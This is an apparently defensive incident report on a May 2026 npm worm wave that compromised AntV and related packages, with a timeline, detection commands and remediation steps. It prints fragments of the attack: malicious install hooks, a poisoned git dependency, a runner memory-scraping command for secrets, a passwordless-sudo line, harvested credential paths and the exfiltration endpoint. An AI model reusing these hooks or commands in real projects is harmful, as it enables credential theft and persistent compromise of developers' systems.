# Mini Shai-Hulud Wave 4 — AntV/atool npm Account Compromise, 323 Packages, Runner Memory Scraping

**Date:** May 2026
**Ecosystem:** npm
**Severity:** Critical
**Type:** Account Takeover / Self-Propagating Worm / CI/CD Secret Theft / Persistent Backdoor
**Sources:**
- [StepSecurity — Shai-Hulud: Here We Go Again. Mass npm Supply Chain Attack Hits the AntV Ecosystem](https://www.stepsecurity.io/blog/shai-hulud-here-we-go-again-mass-npm-supply-chain-attack-hits-the-antv-ecosystem)
- [Aikido — Mini Shai-Hulud strikes again: npm worm compromises hundreds of @antv packages](https://www.aikido.dev/blog/mini-shai-hulud-antv-npm-supply-chain-attack)
- [Wiz — The Worm That Keeps on Digging: TeamPCP Hits @antv in Latest Wave](https://www.wiz.io/blog/mini-shai-hulud-teampcp-hits-antv-supply-chain)
- [Semgrep — Mini Shai-Hulud Resurfaces; Compromised Maintainer of antv, timeago, and size-sensor Packages Revives Worm Activity](https://semgrep.dev/blog/2026/mini-shai-hulud-resurfaces-on-compromised-maintainer-kicking-off-another-cascade)

---

## Summary

On May 19, 2026, a new wave of the Mini Shai-Hulud npm worm compromised Alibaba's AntV data visualization ecosystem and a cluster of co-maintained packages. The attacker used the compromised npm account `atool` (email `i@hust.cc`) — publisher of `timeago.js` (1.5M weekly downloads) and a member of the AntV maintainer team — to push malicious versions of 323 packages spanning charting, graph visualization, mapping, and general-purpose JavaScript utilities. The attack is attributed to TeamPCP, the same threat group behind prior Mini Shai-Hulud waves (TanStack, Mistral AI, LiteLLM, intercom-client, @bitwarden/cli, Checkmarx KICS).

Every compromised package carries a 486–498 KB obfuscated JavaScript payload (Bun runtime) that scrapes GitHub Actions Runner.Worker process memory to extract all masked CI/CD secrets in plaintext, harvests credentials from 130+ file paths, and exfiltrates via two channels: a GitHub API dead-drop in the legitimate `antvis/G2` repository, and a fallback HTTPS connection to `t.m-kosche.com` disguised as an OpenTelemetry collector endpoint. The payload also drops persistent backdoors into Claude Code and VS Code configurations. Over 2,500 public GitHub repositories were created using stolen tokens, each named with Dune-universe terminology and described with the reversed campaign marker string `niagA oG eW ereH :duluH-iahS`.

The attack used two delivery mechanisms: direct `preinstall`/`postinstall` hooks in most packages, and a more sophisticated `optionalDependencies` git reference to a poisoned orphan commit in the legitimate `antvis/G2` repository — bypassing static analysis tools that only inspect the `scripts` field of published tarballs.

---

## Compromised Artifacts

323 packages total. Key examples:

| Package | Compromised Versions | Weekly Downloads |
|---------|---------------------|-----------------|
| `timeago.js` | 4.1.2, 4.2.2 | ~1,500,000 |
| `timeago-react` | 3.1.7, 3.2.7 | — |
| `echarts-for-react` | 3.0.7, 3.1.7, 3.2.7 | — |
| `jest-canvas-mock` | 2.5.3, 2.6.3, 2.7.3 | — |
| `jest-date-mock` | 1.0.11, 1.1.11, 1.2.11 | — |
| `@antv/graphlib` | 2.1.4 | ~50,000–2,000,000 |
| `@antv/g2`, `@antv/g6`, `@antv/l7`, `@antv/s2`, `@antv/g` | Various | ~50,000–2,000,000 each |

Poisoned orphan commit (used via `optionalDependencies`):
`antvis/G2` commit `7cb42f57561c321ecb09b4552802ae0ac55b3a7a`

---

## How It Worked

### Two Delivery Mechanisms

**Pattern A — Direct Install Hook** (most `@antv/*` packages):
```json
"scripts": {
  "preinstall": "node -e \"require('child_process').spawnSync('bun',['run','index.js'],{stdio:'inherit'})\""
}
```
Fires immediately on `npm install`. If Bun is not present, installs it silently via `curl -fsSL https://bun.sh/install | bash`.

**Pattern B — optionalDependencies Git Reference** (echarts-for-react and others):
```json
"optionalDependencies": {
  "@antv/setup": "github:antvis/G2#7cb42f57561c321ecb09b4552802ae0ac55b3a7a"
}
```
The referenced orphan commit contains a `prepare` hook:
```json
"scripts": { "prepare": "bun run index.js && exit 1" }
```
The `&& exit 1` causes the optional dependency to "fail" gracefully, leaving no error trace, while the payload executes in background. This pattern evades static analysis tools that only inspect published tarball `scripts` fields — the malicious code lives in a trusted GitHub organization's commit history, not in the npm package itself.

### Double-Publish Wave Pattern

- **Wave 1** (01:56 UTC May 19): First malicious versions published; runtime installs Bun via `curl | bash` if absent
- **Wave 2** (02:06 UTC May 19, +10 minutes): Second versions with Bun as an explicit npm dependency for more reliable delivery across varied environments

### Payload Obfuscation

The 486–498 KB `index.js` uses `javascript-obfuscator` format: a 1,728-entry string table with PBKDF2-seeded Fisher-Yates rotation, plus a secondary per-string cipher (PBKDF2-SHA256, 200,000 iterations, per-byte substitution via SHA256-seeded stream RNG). Cipher key and salt differ per payload but the algorithm is consistent across the campaign.

### Runner.Worker Memory Scraping

The highest-value capability targets GitHub Actions runners. The payload locates `Runner.Worker` by scanning `/proc/[pid]/cmdline`, reads its memory via `/proc/[pid]/mem`, and pipes through:
```bash
tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' | sort -u
```
This extracts every secret marked `isSecret:true` in runner memory — including `GITHUB_TOKEN`, repository secrets, environment secrets, and organization secrets — all in plaintext, bypassing log masking entirely.

### CI/CD Environment Variable Theft

When running in CI (detected via 15+ CI signals), directly reads: `GITHUB_TOKEN`, `ACTIONS_ID_TOKEN_REQUEST_TOKEN`, `ACTIONS_RUNTIME_TOKEN`, `NPM_TOKEN`, `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `VAULT_TOKEN`, `KUBECONFIG`, and more.

### Filesystem Credential Harvest (130+ paths)

Sweeps cloud configs (`~/.aws`, `~/.config/gcloud`, `~/.azure`), SSH keys, dev tokens (`~/.npmrc`, `~/.pypirc`), Kubernetes/Vault configs, crypto wallets (`~/.bitcoin/wallet.dat`, `~/.ethereum/keystore/*`, `~/.dogecoin/wallet.dat`), chat/messaging apps (Slack, Telegram, Discord), and AI tooling configs (`~/.claude.json`, `~/.claude/mcp.json`).

### Dual-Channel Exfiltration

- **Primary (GitHub dead-drop)**: Encrypts data with a PBKDF2-derived key, commits to `antvis/G2` repository via GitHub REST API. Commit messages embed the fingerprint string `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner`. User-Agent spoofed as `python-requests/2.31.0`.
- **Fallback (direct HTTPS)**: Posts to `t.m-kosche.com:443` at path `api/public/otel/v1/traces` — deliberately mimicking an OpenTelemetry collector endpoint to blend into observability whitelists.

### Persistence Backdoors

| Location | Mechanism |
|----------|-----------|
| `.claude/settings.json` | Injects `SessionStart` hook; re-executes malware on every Claude Code session |
| `.claude/setup.mjs` | Shared setup script for Claude Code persistence |
| `.vscode/tasks.json` | Adds `folderOpen` task; re-executes on every VS Code workspace open |
| `.vscode/setup.mjs` | Shared setup script for VS Code persistence |
| `.github/workflows/codeql.yml` | Injects malicious workflow that exfiltrates all repo secrets on push/deploy |

### Privilege Escalation

On Linux CI runners:
```bash
echo 'runner ALL=(ALL) NOPASSWD:ALL' > /mnt/runner && chmod 0440 /mnt/runner
```
Grants the CI service account full passwordless sudo.

### Daemonization

Forks itself with `__DAEMONIZED=1` env var guard; foreground exits immediately allowing `npm install` to complete normally.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| May 19, 01:56 | Wave 1: First malicious versions published across 323 packages |
| May 19, 02:06 | Wave 2: Second versions with Bun as explicit dependency (+10 min) |
| May 19, onward | 2,500+ GitHub repos created using stolen tokens (Dune-universe names) |
| May 19 | Attack publicly disclosed; t.m-kosche.com added to StepSecurity Global Block List |

---

## Detection

```bash
# Check lockfiles for compromised versions
grep -E "@antv/|echarts-for-react|timeago|jest-canvas-mock|jest-date-mock|size-sensor|lint-md" package-lock.json | grep -v node_modules

# For pnpm
grep -E "@antv/|echarts-for-react|timeago|jest-canvas-mock|jest-date-mock" pnpm-lock.yaml

# Check node_modules for oversized index.js (payload is 400-500 KB)
find node_modules -name "index.js" -size +400k -type f 2>/dev/null

# Check for the malicious optional dependency
grep -r "@antv/setup" node_modules/*/package.json 2>/dev/null

# Check for persistence artifacts
git diff .claude/settings.json
ls -la .claude/setup.mjs
git diff .vscode/tasks.json
ls -la .vscode/setup.mjs
git diff .github/workflows/codeql.yml

# Check for daemonized payload processes
ps aux | grep -E "__DAEMONIZED|bun run index"

# Check network logs during npm install for:
# - Outbound to t.m-kosche.com:443 (path: api/public/otel/v1/traces)
# - GitHub API calls with User-Agent: python-requests/2.31.0
# - Connections to bun.sh during npm install

# Search GitHub for exfiltration repos (campaign marker):
# https://github.com/search?q=niaga+og+ew+ereh+%3Aduluh-iahs&type=repositories

# Check for unexpected python3 processes during CI
# Look for /proc/*/mem reads in GitHub Actions logs
```

---

## Remediation

### For Developer Machines
1. **Pin to safe versions**: Downgrade each affected package to the version before the compromised ones
2. **Clean reinstall**: `rm -rf node_modules && npm install`
3. **Remove persistence artifacts**:
   ```bash
   rm -f .claude/setup.mjs
   git diff .claude/settings.json  # restore from clean state if modified
   git diff .vscode/tasks.json     # restore from clean state if modified
   rm -f .vscode/setup.mjs
   git diff .github/workflows/codeql.yml  # remove if injected
   ```
4. **Rotate credentials**: npm tokens, GitHub PATs, cloud API keys, SSH keys, any secrets on the machine
5. **Transfer crypto wallet funds** if any wallet files were present (`~/.bitcoin`, `~/.ethereum/keystore/*`, etc.)

### For CI/CD Environments
1. **Rotate all CI secrets immediately**: GitHub tokens, npm tokens, cloud credentials, all secrets accessible in affected workflow environments
2. **Audit GitHub repositories** for unauthorized commits, branch creation, or workflow modifications in the past 24–48 hours
3. **Review network logs** for `t.m-kosche.com` connections and `api.github.com` requests with `User-Agent: python-requests/2.31.0`
4. **Check downstream package publishes**: If any packages were published during a compromised CI run, those published versions may also be infected
5. **Review npm access tokens**: `npm token list` and revoke any unrecognized tokens

---

## Lessons Learned

- `optionalDependencies` git references to trusted GitHub orgs are a blind spot for static analysis tools that only inspect published tarball `scripts` fields
- The double-publish wave pattern is a deliberate attacker technique to maximize delivery reliability across different environment configurations
- Runner.Worker memory scraping via `/proc/*/mem` captures every secret in plaintext, bypassing GitHub Actions' log masking — pinning Actions to full SHAs and using Harden-Runner are the only defenses
- Using path `api/public/otel/v1/traces` for C2 exfiltration is a deliberate attempt to blend into OpenTelemetry observability traffic whitelists
- The `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner` fingerprint string in commit messages is a social engineering tactic to discourage victims from revoking stolen tokens
- Claude Code and VS Code configuration backdoors now make local developer tool sessions a persistent C2 foothold, not just a one-time credential grab

---

## Related Incidents

- [./2026-05-mini-shai-hulud-tanstack-npm.md](./2026-05-mini-shai-hulud-tanstack-npm.md) — Prior TeamPCP wave (TanStack + multi-namespace)
- [./2026-05-durabletask-pypi.md](./2026-05-durabletask-pypi.md) — Simultaneous TeamPCP PyPI attack on durabletask
- [./2026-04-mini-shai-hulud-sap-npm.md](./2026-04-mini-shai-hulud-sap-npm.md) — TeamPCP SAP + intercom-client wave
- [./2026-04-bitwarden-cli-shai-hulud.md](./2026-04-bitwarden-cli-shai-hulud.md) — TeamPCP @bitwarden/cli compromise
- [./2026-04-checkmarx-kics-docker-vscode.md](./2026-04-checkmarx-kics-docker-vscode.md) — TeamPCP Checkmarx KICS attack
